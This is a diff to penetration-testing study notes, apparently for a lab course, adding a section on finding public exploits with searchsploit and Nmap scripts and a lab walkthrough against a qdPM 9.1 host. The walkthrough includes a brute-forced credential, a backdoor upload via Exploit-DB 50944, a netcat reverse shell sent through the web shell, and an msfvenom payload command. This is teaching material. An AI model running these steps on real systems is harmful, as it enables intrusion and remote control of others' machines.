@@ -402,9 +402,54 @@
   
 ### 13. Locating public exploits  
 - An exploit is a program or script that can leverage a flaw or vulnerability of a target system. E.g DoS, RCE, privilege escalation.
-- caution: asking root privilege, hex-encoded string of shell command, 
-- [Exploit-DB](https://www.exploit-db.com/)
-- [Packet storm](https://x.com/packet_storm)
+- caution: asking root privilege, hex-encoded string of shell command
+- online exploit resource
+  - [Exploit-DB](https://www.exploit-db.com/)
+  - [Packet storm](https://packetstorm.news/)
+  - [github](https://github.com/)
+  - [offensive-security](https://github.com/offensive-security)
+  - `firefox --search "Microsoft Edge site:exploit-db.com"`
+  - [Exploit Framework](https://www.oreilly.com/library/view/network-security-assessment/9780596510305/ch16.html)
+  - [BeEF](https://beefproject.com/)
+- searchsploit
+  - `sudo apt update && sudo apt install exploitdb`: update exploitdb package
+  - `ls -1 /usr/share/exploitdb/`: CSV for exploit info
+  - `ls -1 /usr/share/exploitdb/exploits`: folder in OS, architecture, scripting language
+  - `searchsploit -t oracle windows`: can search by -t title, -s strict, -c case sensitive
+  - `searchsploit remote smb microsoft windows`: search remote exploits target SMB service on Windows OS
+  - `searchsploit -m windows/remote/48537.py`: copied to /home/kali/48537.py
+  - `searchsploit -m 42031`: copied windows/remote/42031.py
+- Nmap NSE scripts
+  - `grep Exploits /usr/share/nmap/scripts/*.nse`: list NSE scritpt with "Exploits"
+  - `nmap --script-help=clamav-exec.nse`: obtain info of NSE script
+- Exploit target
+  1. open port and service > port 22, 80  
+     `nmap 192.168.204.11`  
+  3. Browse website and discover emails > jeremy@AIDevCorp.org  
+  4. Enumerate website folders > /project  
+     `gobuster dir -u 192.168.204.11 -w /usr/share/wordlists/dirb/common.txt -t5`  
+  6. page source code > software version qdPM 9.1  
+  7. Search exploitDB > https://www.exploit-db.com/exploits/50944  
+  8. Brute force password > george@AIDevCorp.org:AIDevCorp
+  9. Copy exploit script in kali  
+      `searchsploit -m 50944`  
+  11. View the exploit.py  
+      ```
+      parser.add_argument('-url', '--host', dest='hostname', help='Project URL')
+      parser.add_argument('-u', '--email', dest='email', help='User email (Any privilege account)')
+      parser.add_argument('-p', '--password', dest='password', help='User password')
+      ```
+  13. Exploit  
+      `python3 50944.py -url http://192.168.204.11/project/ -u george@AIDevCorp.org -p AIDevCorp`  
+      Output: Backdoor uploaded at - > http://192.168.204.11/project/uploads/users/779889-backdoor.php?cmd=whoami  
+  15. automatically url-encode parameter, verify nc installed on the target  
+      `curl http://192.168.204.11/project/uploads/users/779889-backdoor.php --data-urlencode "cmd=which nc"`  
+  17. Netcat listener  
+      `nc -lvnp 6666`  
+  19. Start reverse shell  
+      `curl http://192.168.204.11/project/uploads/users/779889-backdoor.php --data-urlencode "cmd=nc -nv 192.168.45.160 6666 -e /bin/bash"`  
+  20. generate the exploit payload (optional)  
+      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe`  
 ### 14. Fixing exploits
 ### 15. Antivirus evasion
 ### 16. Password attacks
